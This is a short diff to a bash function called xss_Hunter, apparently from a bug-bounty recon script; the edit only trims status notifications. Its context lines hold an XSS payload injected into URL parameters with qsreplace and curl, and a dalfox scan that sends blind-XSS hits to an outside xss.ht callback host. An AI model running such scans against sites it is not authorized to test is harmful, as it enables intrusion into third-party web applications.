@@ -2,10 +2,7 @@
 
 xss_Hunter()
 {
-    printf "\n==============" | notify --silent
     printf "\nXSS Hunter started" | notify --silent
-    sleep 2
-    printf "\n==============" | notify --silent
 
 #     printf "\nPlease enter a domain : "
 #     read DOMAIN
@@ -28,8 +25,5 @@ xss_Hunter()
     # cat urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>'  | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable:)\n]" || echo "$host \033[0;32m Not able :(\n"; done
     mkdir wayback_xss
     cat ${RUNNING_PATH}/wayback/urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | httpx -status-code -silent | grep -v "404" | cut -d " " -f 1 | kxss |  cut -d " " -f 9 | sed 's/=.*/=/' | dalfox pipe -S -b https://anubhav1403.xss.ht -o wayback_xss/xss-dalfox.txt
-    printf "\n==============" | notify --silent
-    printf "\nXSS Hunter work Finished" | notify --silent
-    sleep 2
-    printf "\n==============" | notify --silent    
+    printf "\nXSS Hunter work Finished" | notify --silent 
 }
